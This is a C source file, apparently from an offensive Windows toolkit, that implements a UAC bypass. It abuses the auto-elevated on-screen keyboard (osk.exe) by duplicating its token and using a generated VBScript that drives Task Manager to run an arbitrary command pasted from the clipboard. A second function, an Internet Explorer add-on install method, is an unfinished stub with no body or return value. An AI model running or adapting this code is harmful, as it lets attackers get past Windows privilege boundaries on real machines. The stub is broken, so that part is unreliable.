#include "pch.h"

BOOL BypassByOsk
(
	_In_ LPSTR lpCommandLine
)
{	
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	DWORD dwPid = 0;
	SECURITY_ATTRIBUTES sa;
	HANDLE hDuplicatedToken = NULL;
	TOKEN_MANDATORY_LABEL TokenInfo;
	PSID pSid = NULL;
	LPWSTR lpTempPath = NULL;
	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 500\ntroll.SendKeys \"%\"\nWScript.Sleep 500\ntroll.SendKeys \"{F}\"\nWScript.Sleep 50\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 500\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 500\ntroll.SendKeys \"{+}\"\nWScript.Sleep 500\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 500\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
	LPWSTR lpCscriptCommandLine = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HGLOBAL hMem = NULL;
	LPWSTR lpGlobalMem = NULL;
	LPWSTR lpTemp = NULL;
	BOOL Result = FALSE;

	SHELLEXECUTEINFOW sei = { sizeof(sei) };
	sei.lpVerb = L"open";
	sei.lpFile = L"osk.exe";
	sei.nShow = SW_SHOW;
	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;
	sei.nShow = SW_HIDE;

	if (!ShellExecuteExW(&sei)) {
		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	dwPid = GetProcessId(sei.hProcess);
	CloseHandle(sei.hProcess);
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
	if (hProc == NULL) {
		LogError(L"OpenProcess failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
		LogError(L"OpenProcessToken failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&sa, sizeof(sa));
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
		LogError(L"DuplicateTokenEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&TokenInfo, sizeof(TokenInfo));
	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
	TokenInfo.Label.Sid = pSid;
	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
		LogError(L"SetTokenInformation failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	LocalFree(pSid);
	if (!WriteToTempPath(szVbsContent, lstrlenA(szVbsContent), L"vbs", &lpTempPath)) {
		goto CLEANUP;
	}

	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
	if (hMem == NULL) {
		LogError(L"GlobalAlloc failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	lpGlobalMem = GlobalLock(hMem);
	lpTemp = ConvertCharToWchar(lpCommandLine);
	lstrcpyW(lpGlobalMem, lpTemp);
	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
	GlobalUnlock(hMem);
	if (!OpenClipboard(NULL)) {
		LogError(L"OpenClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!EmptyClipboard()) {
		LogError(L"EmptyClipboard failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
		LogError(L"SetClipboardData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	CloseClipboard();
	lpCscriptCommandLine = ALLOC((lstrlenW(lpTempPath) + 21) * sizeof(WCHAR));
	lstrcpyW(lpCscriptCommandLine, L"cscript.exe /NOLOGO ");
	lstrcatW(lpCscriptCommandLine, lpTempPath);
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, TRUE, 0, NULL, NULL, &si, &pi)) {
		LogError(L"CreateProcessAsUserW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	DeleteFileW(lpTempPath);
	TerminateProcess(hProc, 0);
	hProc = NULL;
	Result = TRUE;
CLEANUP:
	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	if (hMem != NULL) {
		GlobalFree(hMem);
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	if (hProc != NULL) {
		CloseHandle(hProc);
	}

	if (hDuplicatedToken != NULL) {
		CloseHandle(hDuplicatedToken);
	}

	if (lpCscriptCommandLine != NULL) {
		FREE(lpCscriptCommandLine);
	}

	if (lpTempPath != NULL) {
		FREE(lpTempPath);
	}

	return Result;
}

BOOL IeAddOnInstallMethod
(
	_In_ LPSTR lpCommandLine
)
{
	HRESULT hResult;

	hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hResult)) {
		LogError(L"CoInitializeEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hResult)) {
		LogError(L"CoInitializeSecurity failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}


CLEANUP:
}